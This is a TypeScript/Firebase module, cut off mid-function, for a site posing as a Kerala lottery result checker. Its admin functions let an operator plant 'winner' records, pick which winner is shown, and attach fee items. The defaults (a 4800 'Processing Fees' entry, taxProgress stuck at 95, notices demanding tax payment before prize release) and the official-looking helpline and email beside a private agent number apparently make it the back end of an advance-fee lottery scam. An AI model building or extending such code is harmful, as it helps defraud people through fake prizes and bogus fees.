import {
  collection,
  deleteDoc,
  doc,
  getDoc,
  getDocFromServer,
  getDocs,
  serverTimestamp,
  setDoc,
  Timestamp,
  updateDoc,
  writeBatch
} from 'firebase/firestore';
import {
  auth,
  db,
  handleFirestoreError,
  isFirebaseAdminUser,
  OperationType
} from '../lib/firebase';

export interface FeeItem {
  label: string;
  amount: string;
}

export const DEFAULT_FEES: FeeItem[] = [{ label: 'Processing Fees', amount: '4800' }];

export interface WinnerRecord {
  id: string;
  name: string;
  mobile: string;
  state: string;
  agentCode: string;
  ticketNo: string;
  bookingDate: string;
  amount: string;
  prizeTier: string;
  taxPaymentStatus: string;
  taxProgress: number;
  fees?: FeeItem[];
  taxNotice: string;
  createdAt?: string;
  updatedAt?: string;
}

export interface CheckResultResponse {
  found: boolean;
  isWinner: boolean;
  data?: WinnerRecord;
  message?: string;
  drawDate?: string;
}

export interface PublicSettings {
  drawDate: string;
  isLive?: boolean;
  activeWinnerId?: string;
  activeTicketKey?: string;
  statutoryNotice?: string;
  helpline?: string;
  email?: string;
  agentPhone?: string;
  initialized?: boolean;
}

export interface SettingsFetchState {
  settings: PublicSettings | null;
  exists: boolean;
  networkError: boolean;
}

export type PrizeTicketsMap = Record<string, string[]>;

const LOCAL_STORAGE_KEY = 'kerala_lottery_winners_cache';
const PRIZES_STORAGE_KEY = 'kerala_lottery_prizes_cache';
const SETTINGS_STORAGE_KEY = 'kerala_lottery_settings_cache';
const TOKEN_KEY = 'kerala_lottery_admin_token';

const DEFAULT_STATUTORY_NOTICE =
  '⚠ If you win more than ₹5,00,000, the amount will be transferred through an RBI-authorized process and tax 4500/- must be paid. Any winnings above ₹5 lakh are subject to tax as per RBI rules.';

// Official prize tickets matching result sheet and gazette (used ONLY before first Cloud DB initialization)
export const DEFAULT_PRIZES: PrizeTicketsMap = {
  '1st Prize': ['KD332145', 'KG998045', 'SK243628'],
  'Consolation Prize': [
    'KD3321**',
    'SK2436**',
    'KG9980**',
    'DT6785**',
    'KG7674**',
    'MV7586**',
    'HF6757**',
    'LS6482**',
    'OR6289**',
    'WX2309**',
    'XS9539**',
    'OC6290**'
  ],
  '2nd Prize': [
    'HB387629',
    'MS509186',
    'OD960847',
    'VD757895',
    'CR590563',
    'AX409124'
  ],
  '3rd Prize': [
    'XL560943',
    'DM758320',
    'XS640065',
    'DB390531',
    'KA297852',
    'HR092345',
    'AO092367',
    'BS760931',
    'GF906572'
  ],
  '4th Prize': [
    'DS856323',
    'SG856355',
    'SJ709243',
    'BZ109537',
    'KS856868',
    'VY968258',
    'SK427252',
    'SF529264',
    'KL345112',
    'CT962436',
    'NV760001',
    'UA826282',
    'BS624267',
    'DG065534'
  ],
  '5th Prize': [
    'SN925606',
    'BD093563',
    'XJ387042',
    'XJ759306',
    'DH598435',
    'SF659784',
    'BJ868685',
    'ST650982',
    'NM809567',
    'UG609646',
    'DH609834',
    'SE980658',
    'LT650957',
    'GS549864'
  ],
  '6th Prize': [
    'HSD73548',
    'JD633537',
    'JF839385',
    'IE748363',
    'SK739392',
    'KV563939',
    'FU723784',
    'CY827365',
    'NH739466',
    'UK638475',
    'JR745648',
    'SB738364',
    'LH634838',
    'JC937398',
    'XE839396',
    'VR736378',
    'AS739376',
    'PO648489'
  ]
};

// --- BLUEPRINT SYNCHRONIZED NORMALIZERS & KEY SANITIZERS ---

const TIER_TO_FIELD: Record<string, string> = {
  '1st Prize': 'firstPrize',
  'Consolation Prize': 'consolationPrize',
  '2nd Prize': 'secondPrize',
  '3rd Prize': 'thirdPrize',
  '4th Prize': 'fourthPrize',
  '5th Prize': 'fifthPrize',
  '6th Prize': 'sixthPrize'
};

function normalizeTier(tier: string): string {
  const t = (tier || '').trim().toLowerCase();
  if (t.includes('1st') || t === 'first') return '1st Prize';
  if (t.includes('consolation')) return 'Consolation Prize';
  if (t.includes('2nd') || t === 'second') return '2nd Prize';
  if (t.includes('3rd') || t === 'third') return '3rd Prize';
  if (t.includes('4th') || t === 'fourth') return '4th Prize';
  if (t.includes('5th') || t === 'fifth') return '5th Prize';
  if (t.includes('6th') || t === 'sixth') return '6th Prize';
  return '4th Prize';
}

function isValidFirestoreId(id: string): boolean {
  return typeof id === 'string' && id.length >= 1 && id.length <= 128 && /^[a-zA-Z0-9_-]+$/.test(id);
}

function getMobileLookupKeys(mobile: string): string[] {
  const digits = String(mobile || '').trim().replace(/\D/g, '');
  const keys = new Set<string>();
  if (digits.length > 0 && isValidFirestoreId(digits.slice(0, 128))) {
    keys.add(digits.slice(0, 128));
  }
  if (digits.length >= 10) {
    const last10 = digits.slice(-10);
    if (isValidFirestoreId(last10)) keys.add(last10);
  }
  if (keys.size === 0) {
    const fallback = String(mobile || '')
      .trim()
      .replace(/\s+/g, '')
      .replace(/[^a-zA-Z0-9_-]/g, '_')
      .slice(0, 128);
    if (isValidFirestoreId(fallback)) keys.add(fallback);
  }
  return Array.from(keys);
}

function getTicketLookupKeys(ticketNo: string): string[] {
  const upper = String(ticketNo || '').trim().toUpperCase();
  const keys = new Set<string>();
  const alnum = upper.replace(/[^A-Z0-9]/g, '').slice(0, 128);
  const withSep = upper.replace(/\s+/g, '').replace(/[^A-Z0-9_-]/g, '_').slice(0, 128);
  if (isValidFirestoreId(alnum)) keys.add(alnum);
  if (isValidFirestoreId(withSep)) keys.add(withSep);
  return Array.from(keys);
}

function toTicketLookupKey(ticketNo: string): string {
  return getTicketLookupKeys(ticketNo)[0] || '';
}

async function getDocLive(ref: ReturnType<typeof doc>, path: string) {
  try {
    return await getDocFromServer(ref);
  } catch (err: any) {
    if (err?.code === 'permission-denied') {
      handleFirestoreError(err, OperationType.GET, path);
    }
    try {
      return await getDoc(ref);
    } catch (innerErr: any) {
      if (innerErr?.code === 'permission-denied') {
        handleFirestoreError(innerErr, OperationType.GET, path);
      }
      throw innerErr;
    }
  }
}

function sanitizeTicketArray(arr: unknown): string[] {
  if (!Array.isArray(arr)) return [];
  const seen = new Set<string>();
  const out: string[] = [];
  for (const item of arr) {
    const clean = String(item || '').trim().toUpperCase().slice(0, 32);
    if (clean.length >= 1 && !seen.has(clean)) {
      seen.add(clean);
      out.push(clean);
      if (out.length >= 5000) break;
    }
  }
  return out;
}

function prizesMapToFirestorePayload(map: PrizeTicketsMap) {
  return {
    firstPrize: sanitizeTicketArray(map['1st Prize']),
    consolationPrize: sanitizeTicketArray(map['Consolation Prize']),
    secondPrize: sanitizeTicketArray(map['2nd Prize']),
    thirdPrize: sanitizeTicketArray(map['3rd Prize']),
    fourthPrize: sanitizeTicketArray(map['4th Prize']),
    fifthPrize: sanitizeTicketArray(map['5th Prize']),
    sixthPrize: sanitizeTicketArray(map['6th Prize']),
    updatedAt: serverTimestamp()
  };
}

function firestoreDocToPrizesMap(data: Record<string, any>): PrizeTicketsMap {
  return {
    '1st Prize': Array.isArray(data.firstPrize) ? data.firstPrize : [],
    'Consolation Prize': Array.isArray(data.consolationPrize) ? data.consolationPrize : [],
    '2nd Prize': Array.isArray(data.secondPrize) ? data.secondPrize : [],
    '3rd Prize': Array.isArray(data.thirdPrize) ? data.thirdPrize : [],
    '4th Prize': Array.isArray(data.fourthPrize) ? data.fourthPrize : [],
    '5th Prize': Array.isArray(data.fifthPrize) ? data.fifthPrize : [],
    '6th Prize': Array.isArray(data.sixthPrize) ? data.sixthPrize : []
  };
}

function sanitizeFees(rawFees: unknown): FeeItem[] {
  if (!Array.isArray(rawFees)) return [];
  return rawFees
    .map((item: any) => ({
      label: String(item?.label || '').trim().slice(0, 100),
      amount: String(item?.amount || '').trim().slice(0, 50)
    }))
    .filter((f) => f.label.length > 0 || f.amount.length > 0)
    .slice(0, 20);
}

function timestampToIso(val: unknown): string {
  if (val instanceof Timestamp) {
    return val.toDate().toISOString();
  }
  if (typeof val === 'string' && val.trim()) return val;
  return new Date().toISOString();
}

function formatDateDDMMYYYY(dateStr?: string): string {
  const raw = String(dateStr || '').trim();
  const iso = raw.match(/^(\d{4})-(\d{2})-(\d{2})$/);
  if (iso) return `${iso[3]}-${iso[2]}-${iso[1]}`;
  return raw;
}

function buildPublicSettingsPayload(input: Partial<PublicSettings>) {
  return {
    drawDate: String(input.drawDate || '13-11-2026').trim().slice(0, 32) || '13-11-2026',
    isLive: input.isLive ?? true,
    activeWinnerId: String(input.activeWinnerId || '').trim().slice(0, 128),
    activeTicketKey: String(input.activeTicketKey || '').trim().slice(0, 128),
    statutoryNotice: String(input.statutoryNotice ?? DEFAULT_STATUTORY_NOTICE).trim().slice(0, 1000),
    helpline: String(input.helpline ?? '0471-2305230, 0471-2305193').trim().slice(0, 200),
    email: String(input.email ?? 'cru.lotteries@kerala.gov.in').trim().slice(0, 200),
    agentPhone: String(input.agentPhone ?? '9583405079').trim().slice(0, 64),
    initialized: true,
    updatedAt: serverTimestamp()
  };
}

function sanitizeWinnerMutableFields(w: Partial<WinnerRecord>) {
  const name = String(w.name || '').trim().toUpperCase().slice(0, 150);
  const mobile = String(w.mobile || '').trim().slice(0, 20);
  const ticketNo = String(w.ticketNo || '').trim().toUpperCase().slice(0, 32);

  if (!name || !mobile || !ticketNo) {
    throw new Error('Winner name, mobile number, and ticket number are required.');
  }

  const rawProgress = Number(w.taxProgress);
  const taxProgress = Number.isNaN(rawProgress) ? 95 : Math.min(100, Math.max(0, rawProgress));
  return {
    name,
    mobile,
    state: String(w.state || 'Kerala').trim().slice(0, 80),
    agentCode: String(w.agentCode || '690003').trim().slice(0, 32),
    ticketNo,
    bookingDate: String(w.bookingDate || new Date().toISOString().split('T')[0]).trim().slice(0, 32),
    amount: String(w.amount || '₹ 10,00,000/-').trim().slice(0, 64),
    prizeTier: normalizeTier(String(w.prizeTier || '4th Prize')).slice(0, 64),
    taxPaymentStatus: String(w.taxPaymentStatus || 'Processing.').trim().slice(0, 128),
    taxProgress,
    fees: w.fees !== undefined ? sanitizeFees(w.fees) : DEFAULT_FEES.map((f) => ({ ...f })),
    taxNotice: String(
      w.taxNotice ||
        `Mr/Mrs ${name}, your tax payment is not complete. Please make the payment and receive your prize money.`
    )
      .trim()
      .slice(0, 600)
  };
}

function docToWinnerRecord(id: string, data: Record<string, any>): WinnerRecord {
  return {
    id: String(data.id || data.winnerId || id),
    name: String(data.name || ''),
    mobile: String(data.mobile || ''),
    state: String(data.state || 'Kerala'),
    agentCode: String(data.agentCode || '690003'),
    ticketNo: String(data.ticketNo || ''),
    bookingDate: String(data.bookingDate || ''),
    amount: String(data.amount || '₹ 10,00,000/-'),
    prizeTier: String(data.prizeTier || '4th Prize'),
    taxPaymentStatus: String(data.taxPaymentStatus || 'Processing.'),
    taxProgress: Number(data.taxProgress ?? 95),
    fees: Array.isArray(data.fees) ? data.fees : [],
    taxNotice: String(data.taxNotice || ''),
    createdAt: data.createdAt ? timestampToIso(data.createdAt) : undefined,
    updatedAt: data.updatedAt ? timestampToIso(data.updatedAt) : undefined
  };
}

function isCloudAdminSignedIn(): boolean {
  return isFirebaseAdminUser(auth.currentUser);
}

export function isCloudDatabaseConnected(): boolean {
  return isCloudAdminSignedIn();
}

const CLOUD_REQUIRED_ERROR =
  'Cloud Database is not connected yet. Please connect Google Cloud Database first so your data is saved permanently and never auto-deletes.';

// Check if Cloud Firestore has been initialized already (authoritative across containers/devices)
async function getFirestoreSettingsDocState(): Promise<SettingsFetchState> {
  const path = 'settings/public';
  try {
    const snap = await getDocLive(doc(db, 'settings', 'public'), path);
    if (!snap.exists()) {
      return { settings: null, exists: false, networkError: false };
    }
    const data = snap.data();
    return {
      exists: true,
      networkError: false,
      settings: {
        drawDate: String(data.drawDate || '13-11-2026'),
        isLive: Boolean(data.isLive ?? true),
        activeWinnerId: String(data.activeWinnerId || ''),
        activeTicketKey: String(data.activeTicketKey || ''),
        statutoryNotice: String(data.statutoryNotice || DEFAULT_STATUTORY_NOTICE),
        helpline: String(data.helpline || ''),
        email: String(data.email || ''),
        agentPhone: String(data.agentPhone || ''),
        initialized: Boolean(data.initialized)
      }
    };
  } catch (err: any) {
    if (err?.code === 'permission-denied') {
      handleFirestoreError(err, OperationType.GET, path);
    }
    return { settings: null, exists: false, networkError: true };
  }
}

async function getFirestoreSettingsDoc(): Promise<PublicSettings | null> {
  const state = await getFirestoreSettingsDocState();
  return state.settings;
}

let initFirestorePromise: Promise<{
  initializedNow: boolean;
  alreadyInitialized: boolean;
}> | null = null;

/**
 * One-time migration when admin connects Google Firebase for the very first time.
 * CRITICAL: If settings/public ALREADY exists in Firestore, this does NOTHING so deleted records/tickets are NEVER re-created!
 * Also explicitly strips any sample/fake winner (e.g. win-001 / GAJANAN) and SONY SIR.
 */
export async function initializeFirestoreIfEmpty(): Promise<{
  initializedNow: boolean;
  alreadyInitialized: boolean;
}> {
  if (!isCloudAdminSignedIn()) {
    return { initializedNow: false, alreadyInitialized: false };
  }

  if (initFirestorePromise) {
    return initFirestorePromise;
  }

  initFirestorePromise = (async () => {
    const state = await getFirestoreSettingsDocState();
    if (state.networkError) {
      throw new Error('Unable to reach Cloud Firestore. Please check your internet connection.');
    }
    if (state.exists && state.settings?.initialized) {
      return { initializedNow: false, alreadyInitialized: true };
    }

  // Pull current Express backend data ONLY for first-time initialization
  let serverSettings: PublicSettings = {
    drawDate: '13-11-2026',
    isLive: true,
    activeWinnerId: '',
    statutoryNotice: DEFAULT_STATUTORY_NOTICE,
    helpline: '0471-2305230, 0471-2305193',
    email: 'cru.lotteries@kerala.gov.in',
    agentPhone: '9583405079'
  };
  let serverPrizes: PrizeTicketsMap = DEFAULT_PRIZES;
  let serverWinners: WinnerRecord[] = [];

  try {
    const token = getAdminToken();
    const [setRes, przRes, winRes] = await Promise.all([
      fetch(`/api/settings?_t=${Date.now()}`, { cache: 'no-store' }),
      fetch(`/api/prizes?_t=${Date.now()}`, { cache: 'no-store' }),
      token
        ? fetch('/api/admin/winners', { headers: { Authorization: `Bearer ${token}` } })
        : Promise.resolve(null)
    ]);

    if (setRes.ok) {
      const sData = await setRes.json();
      if (sData?.drawDate) serverSettings = { ...serverSettings, ...sData };
    }
    if (przRes.ok) {
      const pData = await przRes.json();
      if (pData?.prizeTickets) serverPrizes = pData.prizeTickets;
    }
    if (winRes && winRes.ok) {
      const wData = await winRes.json();
      if (Array.isArray(wData.winners)) {
        // Explicitly exclude sample/fake win-001 (GAJANAN)
        serverWinners = wData.winners.filter(
          (w: WinnerRecord) =>
            w.id !== 'win-001' && !String(w.name || '').toUpperCase().includes('GAJANAN')
        );
      }
    }
  } catch {
    // Fallback cleanly to defaults without sample winners
  }

  // Remove SONY SIR if present anywhere
  const cleanedPrizes: PrizeTicketsMap = {};
  for (const [k, list] of Object.entries(serverPrizes)) {
    cleanedPrizes[k] = (Array.isArray(list) ? list : []).filter(
      (t) => !String(t).toUpperCase().includes('SONY SIR')
    );
  }

  const activeWinner =
    serverWinners.find((w) => w.id === serverSettings.activeWinnerId) || serverWinners[0] || null;

  const batch = writeBatch(db);
  batch.set(
    doc(db, 'settings', 'public'),
    buildPublicSettingsPayload({
      ...serverSettings,
      activeWinnerId: activeWinner?.id || '',
      activeTicketKey: activeWinner ? toTicketLookupKey(activeWinner.ticketNo) : ''
    })
  );
  batch.set(doc(db, 'prizes', 'current'), prizesMapToFirestorePayload(cleanedPrizes));

  for (const w of serverWinners) {
    if (!isValidFirestoreId(w.id)) continue;
    const mutable = sanitizeWinnerMutableFields(w);
    batch.set(doc(db, 'winners', w.id), {
      id: w.id,
      ...mutable,
      createdAt: serverTimestamp(),
      updatedAt: serverTimestamp()
    });
    const lookupPayload = {
      winnerId: w.id,
      ...mutable,
      updatedAt: serverTimestamp()
    };
    for (const mKey of getMobileLookupKeys(mutable.mobile)) {
      batch.set(doc(db, 'lookup_by_mobile', mKey), lookupPayload);
    }
    for (const tKey of getTicketLookupKeys(mutable.ticketNo)) {
      batch.set(doc(db, 'lookup_by_ticket', tKey), lookupPayload);
    }
  }

  try {
    await batch.commit();
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, 'settings/public');
  }

  return { initializedNow: true, alreadyInitialized: false };
  })();

  try {
    return await initFirestorePromise;
  } finally {
    initFirestorePromise = null;
  }
}

export function getCachedSettings(): PublicSettings {
  try {
    const raw = localStorage.getItem(SETTINGS_STORAGE_KEY);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (parsed && typeof parsed === 'object') return parsed;
    }
  } catch {}
  return { drawDate: '13-11-2026', isLive: true };
}

function getCachedDrawDate(): string {
  return getCachedSettings().drawDate || '13-11-2026';
}

// --- VALIDATION HELPERS ---
export const Validators = {
  isValidIndianMobile: (mobile: string): boolean => {
    const clean = mobile.trim().replace(/\D/g, '');
    return clean.length === 10;
  },
  isValidTicketNumber: (ticket: string): boolean => {
    const clean = ticket.trim().replace(/\s+/g, '');
    return clean.length >= 2 && clean.length <= 16;
  },
  isValidName: (name: string): boolean => {
    return name.trim().length >= 2;
  },
  isValidAgentCode: (code: string): boolean => {
    const clean = code.trim();
    return clean.length === 0 || /^\d{3,8}$/.test(clean);
  },
  isValidAmount: (amount: string): boolean => {
    return amount.trim().length >= 1;
  }
};

// Public: Fetch Prize Tickets (Firestore authoritative once initialized — never falls back to defaults if initialized)
export async function fetchPrizeTickets(): Promise<PrizeTicketsMap> {
  try {
    const snap = await getDocLive(doc(db, 'prizes', 'current'), 'prizes/current');
    if (snap.exists()) {
      const map = firestoreDocToPrizesMap(snap.data());
      localStorage.setItem(PRIZES_STORAGE_KEY, JSON.stringify(map));
      return map;
    }
    const settingsState = await getFirestoreSettingsDocState();
    if (settingsState.exists && settingsState.settings?.initialized) {
      return firestoreDocToPrizesMap({});
    }
  } catch (err: any) {
    if (err?.code === 'permission-denied') {
      handleFirestoreError(err, OperationType.GET, 'prizes/current');
    }
    console.warn('Firestore prize fetch fell back to API:', err);
  }

  try {
    const res = await fetch(`/api/prizes?_t=${Date.now()}`, { cache: 'no-store' });
    if (res.ok) {
      const data = await res.json();
      if (data.prizeTickets) {
        localStorage.setItem(PRIZES_STORAGE_KEY, JSON.stringify(data.prizeTickets));
        return data.prizeTickets;
      }
    }
  } catch (err) {
    console.warn('Failed to fetch prizes from backend, using local cache:', err);
  }

  try {
    const cached = localStorage.getItem(PRIZES_STORAGE_KEY);
    if (cached) {
      const parsed = JSON.parse(cached);
      if (parsed && typeof parsed === 'object') return parsed;
    }
  } catch {}

  return DEFAULT_PRIZES;
}

// Public: Fetch Result Sheet Settings
export async function fetchPublicSettings(): Promise<PublicSettings> {
  const fsSettings = await getFirestoreSettingsDoc();
  if (fsSettings) {
    localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(fsSettings));
    return fsSettings;
  }

  try {
    const res = await fetch(`/api/settings?_t=${Date.now()}`, { cache: 'no-store' });
    if (res.ok) {
      const data = await res.json();
      if (data && data.drawDate) {
        localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(data));
        return data;
      }
    }
  } catch (err) {
    console.warn('Failed to fetch settings from backend, using cache:', err);
  }

  return getCachedSettings();
}

// Admin: Update Public Settings (strictly requires Cloud Firestore connection so edits never vanish on container restart)
export async function updateAdminSettings(
  updates: Partial<PublicSettings>
): Promise<{
  success: boolean;
  settings?: PublicSettings;
  error?: string;
  unauthorized?: boolean;
  requiresCloudConnect?: boolean;
}> {
  if (!isCloudAdminSignedIn()) {
    return { success: false, requiresCloudConnect: true, error: CLOUD_REQUIRED_ERROR };
  }

  const token = getAdminToken();
  let mergedSettings: PublicSettings = { ...getCachedSettings(), ...updates };

  try {
    const currentFs = await getFirestoreSettingsDoc();
    const base = currentFs || getCachedSettings();
    mergedSettings = { ...base, ...updates, initialized: true };
    const ref = doc(db, 'settings', 'public');
    if (currentFs) {
      await updateDoc(ref, buildPublicSettingsPayload(mergedSettings));
    } else {
      await setDoc(ref, buildPublicSettingsPayload(mergedSettings));
    }
    localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(mergedSettings));
    window.dispatchEvent(new CustomEvent('kerala-settings-updated', { detail: mergedSettings }));
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, 'settings/public');
  }

  // Best-effort sync to Express container cache
  if (token) {
    fetch('/api/admin/settings', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${token}`
      },
      body: JSON.stringify(updates)
    }).catch(() => {});
  }

  return { success: true, settings: mergedSettings };
}

// Admin: Add ticket(s) directly into a prize section (strictly Cloud Firestore permanent write)
export async function addPrizeTicket(
  tier: string,
  ticketInput: string | string[]
): Promise<{
  success: boolean;
  prizeTickets?: PrizeTicketsMap;
  error?: string;
  message?: string;
  addedCount?: number;
  unauthorized?: boolean;
  requiresCloudConnect?: boolean;
}> {
  if (!isCloudAdminSignedIn()) {
    return { success: false, requiresCloudConnect: true, error: CLOUD_REQUIRED_ERROR };
  }

  const token = getAdminToken();
  const normalizedTier = normalizeTier(tier);
  const ticketList = Array.isArray(ticketInput)
    ? ticketInput.map((t) => String(t || '').trim().toUpperCase()).filter((t) => t.length >= 2)
    : String(ticketInput)
        .split(/[\n,;\t]+/)
        .map((t) => t.trim().toUpperCase())
        .filter((t) => t.length >= 2);

  if (ticketList.length === 0) {
    return { success: false, error: 'No valid ticket numbers found' };
  }

  let fsUpdatedPrizes: PrizeTicketsMap;
  let fsAddedCount = 0;

  try {
    const prizeRef = doc(db, 'prizes', 'current');
    const snap = await getDocLive(prizeRef, 'prizes/current');
    const currentMap: PrizeTicketsMap = snap.exists()
      ? firestoreDocToPrizesMap(snap.data())
      : firestoreDocToPrizesMap({});

    const tierArr = [...(currentMap[normalizedTier] || [])];
    for (const t of ticketList) {
      const clean = t.slice(0, 32);
      if (!tierArr.includes(clean)) {
        tierArr.unshift(clean);
        fsAddedCount++;
      }
    }
    currentMap[normalizedTier] = tierArr.slice(0, 5000);
    fsUpdatedPrizes = currentMap;

    if (snap.exists()) {
      const field = TIER_TO_FIELD[normalizedTier] || 'fourthPrize';
      await updateDoc(prizeRef, {
        [field]: sanitizeTicketArray(currentMap[normalizedTier]),
        updatedAt: serverTimestamp()
      });
    } else {
      await setDoc(prizeRef, prizesMapToFirestorePayload(currentMap));
    }
    localStorage.setItem(PRIZES_STORAGE_KEY, JSON.stringify(currentMap));
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, 'prizes/current');
  }

  // Best-effort local Express cache sync
  if (token) {
    fetch('/api/admin/prizes', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${token}`
      },
      body: JSON.stringify({
        tier: normalizedTier,
        tickets: Array.isArray(ticketInput) ? ticketInput : undefined,
        ticketNo: typeof ticketInput === 'string' ? ticketInput : undefined
      })
    }).catch(() => {});
  }

  return {
    success: true,
    prizeTickets: fsUpdatedPrizes!,
    message:
      fsAddedCount === 1
        ? `Ticket "${ticketList[0]}" saved permanently to ${normalizedTier}!`
        : `${fsAddedCount} tickets saved permanently to ${normalizedTier}!`,
    addedCount: fsAddedCount
  };
}

// Admin: Delete a ticket from a prize section (permanently deleted in Cloud Firestore)
export async function deletePrizeTicket(
  tier: string,
  ticketNo: string
): Promise<{
  success: boolean;
  prizeTickets?: PrizeTicketsMap;
  error?: string;
  unauthorized?: boolean;
  requiresCloudConnect?: boolean;
}> {
  if (!isCloudAdminSignedIn()) {
    return { success: false, requiresCloudConnect: true, error: CLOUD_REQUIRED_ERROR };
  }

  const token = getAdminToken();
  const normalizedTier = normalizeTier(tier);
  const cleanTicket = ticketNo.trim().toUpperCase();
  let fsUpdatedPrizes: PrizeTicketsMap = firestoreDocToPrizesMap({});

  try {
    const prizeRef = doc(db, 'prizes', 'current');
    const snap = await getDocLive(prizeRef, 'prizes/current');
    if (snap.exists()) {
      const currentMap = firestoreDocToPrizesMap(snap.data());
      currentMap[normalizedTier] = (currentMap[normalizedTier] || []).filter(
        (t) => String(t).trim().toUpperCase() !== cleanTicket
      );
      const field = TIER_TO_FIELD[normalizedTier] || 'fourthPrize';
      await updateDoc(prizeRef, {
        [field]: sanitizeTicketArray(currentMap[normalizedTier]),
        updatedAt: serverTimestamp()
      });
      fsUpdatedPrizes = currentMap;
      localStorage.setItem(PRIZES_STORAGE_KEY, JSON.stringify(currentMap));
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, 'prizes/current');
  }

  if (token) {
    fetch('/api/admin/prizes/delete', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${token}`
      },
      body: JSON.stringify({ tier: normalizedTier, ticketNo: cleanTicket })
    }).catch(() => {});
  }

  return { success: true, prizeTickets: fsUpdatedPrizes };
}

// Public: Fetch currently active live winner for LiveDrawModal / Admin highlight
export async function fetchActiveWinner(): Promise<WinnerRecord | null> {
  const fsSettings = await getFirestoreSettingsDoc();
  if (fsSettings && fsSettings.initialized) {
    if (!fsSettings.activeTicketKey || !isValidFirestoreId(fsSettings.activeTicketKey)) {
      return null;
    }
    const keysToTry = Array.from(
      new Set([fsSettings.activeTicketKey, ...getTicketLookupKeys(fsSettings.activeTicketKey)])
    ).filter(isValidFirestoreId);
    for (const key of keysToTry) {
      try {
        const snap = await getDocLive(doc(db, 'lookup_by_ticket', key), `lookup_by_ticket/${key}`);
        if (snap.exists()) {
          return docToWinnerRecord(fsSettings.activeWinnerId || snap.id, snap.data());
        }
      } catch (err: any) {
        if (err?.code === 'permission-denied') {
          handleFirestoreError(err, OperationType.GET, `lookup_by_ticket/${key}`);
        }
      }
    }
    return null;
  }

  try {
    const res = await fetch(`/api/active-winner?_t=${Date.now()}`, { cache: 'no-store' });
    if (res.ok) {
      const data = await res.json();
      if (data.drawDate) {
        try {
          const prev = JSON.parse(localStorage.getItem(SETTINGS_STORAGE_KEY) || '{}');
          localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify({ ...prev, drawDate: data.drawDate }));
        } catch {}
      }
      if (data.winner) {
        saveWinnerToLocalCache(data.winner);
        return data.winner;
      }
      localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify([]));
      return null;
    }
  } catch (err) {
    console.warn('Failed to fetch active winner, checking local cache:', err);
  }
  const cached = getLocalCacheWinners();
  return cached[0] || null;
}

// Admin: Set a winner as the active live winner on the website
export async function setActiveWinner(
  id: string
): Promise<{ success: boolean; message?: string; unauthorized?: boolean; requiresCloudConnect?: boolean }> {
  if (!isCloudAdminSignedIn()) {
    return { success: false, requiresCloudConnect: true, message: CLOUD_REQUIRED_ERROR };
  }

  const token = getAdminToken();
  if (!isValidFirestoreId(id)) {
    return { success: false, message: 'Invalid winner ID' };
  }

  try {
    const wSnap = await getDocLive(doc(db, 'winners', id), `winners/${id}`);
    if (!wSnap.exists()) {
      return { success: false, message: 'Winner record not found in Cloud Database' };
    }
    const wData = wSnap.data();
    const tKey = toTicketLookupKey(wData.ticketNo || '');
    const currentSettings = (await getFirestoreSettingsDoc()) || getCachedSettings();
    await setDoc(
      doc(db, 'settings', 'public'),
      buildPublicSettingsPayload({
        ...currentSettings,
        activeWinnerId: id,
        activeTicketKey: tKey
      })
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, 'settings/public');
  }

  if (token) {
    fetch(`/api/admin/active-winner/${id}`, {
      method: 'PUT',
      headers: { Authorization: `Bearer ${token}` }
    }).catch(() => {});
  }

  return {
    success: true,
    message: 'Active live winner updated permanently in Cloud Database!'
  };
}

// Public: Check result for a mobile number or ticket number (strictly exact match, never fabricates fake winners or uses stale localStorage)
export async function checkLotteryResult(query: string): Promise<CheckResultResponse> {
  const clean = query.trim().replace(/\s+/g, '');

  // Strictly require a non-empty mobile or ticket number
  if (!clean) {
    return {
      found: false,
      isWinner: false,
      drawDate: getCachedDrawDate(),
      message: 'Please enter a valid mobile number or ticket number to check results.'
    };
  }

  const settingsState = await getFirestoreSettingsDocState();
  const fsSettings = settingsState.settings;
  if (fsSettings && fsSettings.initialized) {
    const drawDate = fsSettings.drawDate || getCachedDrawDate();
    const mobileKeys = getMobileLookupKeys(clean);
    const ticketKeys = getTicketLookupKeys(clean);

    // 1. Check all normalized mobile keys live from Firestore server
    if (/\d{4}/.test(clean.replace(/\D/g, ''))) {
      for (const mKey of mobileKeys) {
        try {
          const mSnap = await getDocLive(
            doc(db, 'lookup_by_mobile', mKey),
            `lookup_by_mobile/${mKey}`
          );
          if (mSnap.exists()) {
            const winner = docToWinnerRecord(mSnap.data().winnerId || mSnap.id, mSnap.data());
            return {
              found: true,
              isWinner: true,
              data: winner,
              drawDate: formatDateDDMMYYYY(winner.bookingDate) || drawDate
            };
          }
        } catch (err: any) {
          if (err?.code === 'permission-denied') {
            handleFirestoreError(err, OperationType.GET, `lookup_by_mobile/${mKey}`);
          }
        }
      }
    }

    // 2. Check all normalized ticket keys live from Firestore server
    for (const tKey of ticketKeys) {
      try {
        const tSnap = await getDocLive(
          doc(db, 'lookup_by_ticket', tKey),
          `lookup_by_ticket/${tKey}`
        );
        if (tSnap.exists()) {
          const winner = docToWinnerRecord(tSnap.data().winnerId || tSnap.id, tSnap.data());
          return {
            found: true,
            isWinner: true,
            data: winner,
            drawDate: formatDateDDMMYYYY(winner.bookingDate) || drawDate
          };
        }
      } catch (err: any) {
        if (err?.code === 'permission-denied') {
          handleFirestoreError(err, OperationType.GET, `lookup_by_ticket/${tKey}`);
        }
      }
    }

    // Authoritative "not found" from Cloud Database — NEVER resurrect deleted or fake winners
    return {
      found: false,
      isWinner: false,
      drawDate,
      message: `No registered winning ticket found for ${clean} in Draw ${drawDate}.`
    };
  }

  // Fallback to Express backend ONLY when Firestore has not yet been initialized
  try {
    const res = await fetch(`/api/check-result?query=${encodeURIComponent(clean)}&_t=${Date.now()}`, {
      cache: 'no-store'
    });
    if (res.ok) {
      return await res.json();
    }
  } catch (err) {
